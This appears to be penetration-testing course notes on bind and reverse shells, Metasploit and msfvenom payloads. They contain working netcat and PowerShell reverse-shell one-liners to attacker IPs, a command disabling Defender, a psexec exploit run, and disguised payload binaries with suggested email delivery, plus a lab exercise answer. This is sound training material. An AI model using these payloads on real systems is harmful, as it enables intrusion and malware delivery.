A `shell` is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example). As penetration testers and information security professionals, a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host.

- `"I caught a shell."`
- `"I popped a shell!"`
- `"I dropped into a shell!"`
- `"I'm in!"`

Typically these phrases translate to the understanding that this person has successfully exploited a vulnerability on a system and has been able to gain remote control of the shell on the target computer's operating system. This is a common goal a penetration tester will have when attempting to access a vulnerable machine. We will notice that most of this module will focus on what comes after enumeration and identification of promising exploits.

Establishing a shell also allows us to maintain persistence on the system, giving us more time to work. It can make it easier to use our `attack tools`, `exfiltrate data`, `gather`, `store` and `document` all the details of our attack, as we will soon see in the proceeding demonstrations. It's important to note that establishing a shell almost always means we are accessing the CLI of the OS, and this can make us harder to notice than if we were remotely accessing a graphical shell over [VNC](https://en.wikipedia.org/wiki/Virtual_Network_Computing) or [RDP](https://www.cloudflare.com/learning/access-management/what-is-the-remote-desktop-protocol/).
## Payloads Deliver us Shells

Within the IT industry as a whole, a `payload` can be defined in a few different ways:

- `Networking`: The encapsulated data portion of a packet traversing modern computer networks.
- `Basic Computing`: A payload is the portion of an instruction set that defines the action to be taken. Headers and protocol information removed.
- `Programming`: The data portion referenced or carried by the programming language instruction.
- `Exploitation & Security`: A payload is `code` crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.
# Anatomy of a Shell

Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. Here are some of the most common terminal emulators:

|**Terminal Emulator**|**Operating System**|
|:--|:--|
|[Windows Terminal](https://github.com/microsoft/terminal)|Windows|
|[cmder](https://cmder.app/)|Windows|
|[PuTTY](https://www.putty.org/)|Windows|
|[kitty](https://sw.kovidgoyal.net/kitty/)|Windows, Linux and MacOS|
|[Alacritty](https://github.com/alacritty/alacritty)|Windows, Linux and MacOS|
|[xterm](https://invisible-island.net/xterm/)|Linux|
|[GNOME Terminal](https://en.wikipedia.org/wiki/GNOME_Terminal)|Linux|
|[MATE Terminal](https://github.com/mate-desktop/mate-terminal)|Linux|
|[Konsole](https://konsole.kde.org/)|Linux|
|[Terminal](https://en.wikipedia.org/wiki/Terminal_\(macOS\))|MacOS|
|[iTerm2](https://iterm2.com/)|MacOS|
This list is by no means every terminal emulator available, but it does include some noteworthy ones.
# Bind Shell
## What Is It?

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).
There can be many challenges associated with getting a shell this way. Here are some to consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.
### Example

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l IP_victim 7777 > /tmp/f # Listener on the victim host
```
In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.
```shell
nc -nv IP_victim 7777
```
# Reverse Shells

With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.

We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario.

We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: Unrestricted File Upload, Command Injection, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.
## Hands-on With A Simple Reverse Shell in Windows

```shell
# Attack Macine
sudo nc -lvnp 443
```
This time around with our listener, we are binding it to a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) (`443`), this port usually is for `HTTPS` connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday.

`What applications and shell languages are hosted on the target?` This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.231.136',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

>[!Error] 
>The `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):
>```powershell
># Disabling the AV real-time monitoring
>C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
>```

Once AV is disabled, attempt to execute the code again.

We should notice that we successfully established a reverse shell. We can see this by the change in the prompt that starts with `PS` and our ability to interact with the OS and file system. Try running some standard Windows commands to practice a bit.
## One-Liners Examined

#### Netcat/Bash Reverse Shell One-liner

```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
#### Remove /tmp/f

```shell
rm -f /tmp/f; 
```

Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.

#### Make A Named Pipe

```shell
mkfifo /tmp/f; 
```

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

#### Output Redirection

```shell
cat /tmp/f | 
```

Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).

#### Set Shell Options

```shell
/bin/bash -i 2>&1 | 
```

Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).

#### Open a Connection with Netcat

```shell
nc 10.10.14.12 7777 > /tmp/f` 
```

Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed
## PowerShell One-liner Explained

The shells & payloads we choose to use largely depend on which OS we are attacking. Be mindful of this as we continue throughout the module. We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell. Let's breakdown the one-liner we used:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Calling PowerShell

```powershell
powershell -nop -c
```

Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in `cmd.exe`.
#### Binding A Socket

"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
powershell
Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (`;`) ensures the commands & code are executed sequentially.
```
```
#### Setting The Command Stream

```powershell
$stream = $client.GetStream();
```

Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications. The semi-colon (`;`) ensures the commands & code are executed sequentially.
#### Empty Byte Stream

```powershell
[byte[]]$bytes = 0..65535|%{0}; 
```

Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

#### Stream Parameters

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```

Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.

#### Set The Byte Encoding

```powershell
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```

Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (`;`) ensures the commands & code are executed sequentially.

#### Invoke-Expression

```powershell
$sendback = (iex $data 2>&1 | Out-String ); 
```

Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (`;`) ensures the commands & code are executed sequentially.

#### Show Working Directory

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```

Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (`;`) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.

#### Sets Sendbyte

```powershell
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

#### Terminate TCP Connection

```powershell
$client.Close()"
```

This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.
# Automating Payloads & Delivery with Metasploit

[Metasploit](https://www.metasploit.com/) is an automated attack framework developed by `Rapid7` that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and deliver payloads to gain a shell on a vulnerable system.
## Practicing with Metasploit

We could spend the rest of this module covering everything about Metasploit, but we are only going to go so far as to work with the very basics within the context of shells & payloads.
In this case, we will be using enumeration results from a `nmap` scan to pick a Metasploit module to use.
#### NMAP Scan

```shell
nmap -sC -sV -Pn 10.129.164.25
# Output
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)

Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```
Once we have this information, we can use Metasploit's search functionality to discover modules that are associated with SMB. In the `msfconsole`, we can issue the command `search smb` to get a list of modules associated with SMB vulnerabilities:

```msfconsole
search smb
```

We will see a long list of Matching Modules associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a Name, Disclosure Date, Rank, Check and Description.

Let's look at one module, in particular, to understand it within the context of payloads.

`56 exploit/windows/smb/psexec`

|Output|Meaning|
|---|---|
|`56`|The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module.|
|`exploit/`|This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.|
|`windows/`|This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.|
|`smb/`|This defines the service for which the payload in the module is written.|
|`psexec`|This defines the tool that will get uploaded to the target system if it is vulnerable.|
We use the module by typing `use exploit/windows/smb/psexec`

```shell
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Then when we set the options, we can run the exploit:

```shell
exploit

[*] Started reverse TCP handler on 10.10.14.222:4444
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter >
```
## Exercise
### Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)

staffsalaries.txt
# Crafting Payloads with MSFvenom
## Practicing with MSFvenom

In Pwnbox or any host with MSFvenom installed, we can issue the command `msfvenom -l payloads` to list all the available payloads. Below are just some of the payloads available. A few payloads have been redacted to shorten the output and not distract from the core lesson. Take a close look at the payloads and their descriptions:

```shell
msfconsole -l payloads
```

`What do you notice about the output?`

We can see a few details that will help us understand payloads further. First of all, we can see that the payload naming convention almost always starts by listing the OS of the target (`Linux`, `Windows`, `MacOS`, `mainframe`, etc...). We can also see that some payloads are described as (`staged`) or (`stageless`).
## Staged vs. Stageless Payloads

`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.
## Building A Stageless Payload

Now let's build a simple stageless payload with msfvenom and break down the command.
#### Build It

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

#### Call MSFvenom

```shell-session
msfvenom
```

Defines the tool used to make the payload.
#### Creating a Payload

```shell-session
-p
```

This `option` indicates that msfvenom is creating a payload.
#### Choosing the Payload based on Architecture

```shell-session
linux/x64/shell_reverse_tcp
```

Specifies a `Linux` `64-bit` stageless payload that will initiate a TCP-based reverse shell (`shell_reverse_tcp`).

#### Address To Connect Back To

```shell-session
LHOST=10.10.14.113 LPORT=443
```

When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).
#### Format To Generate Payload In

```shell-session
-f elf
```

The `-f` flag specifies the format the generated binary will be in. In this case, it will be an [.elf file](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Output

```shell-session
> createbackup.elf
```

Creates the .elf binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.
## Executing a Stageless Payload

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.

We would have a listener ready to catch the connection on the attack box side upon successful execution.
## Building a simple Stageless Payload for a Windows system

We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell.
#### Windows Payload

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
## Executing a Simple Stageless Payload On a Windows System

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.
  
![File explorer showing 'BonusCompensationPlan.pdf' in the Downloads folder on a Windows system.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/115/winpayload.png)

If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

```shell
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir

 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```
# Infiltrating Windows

Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.
## Prominent Windows Exploits

Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time.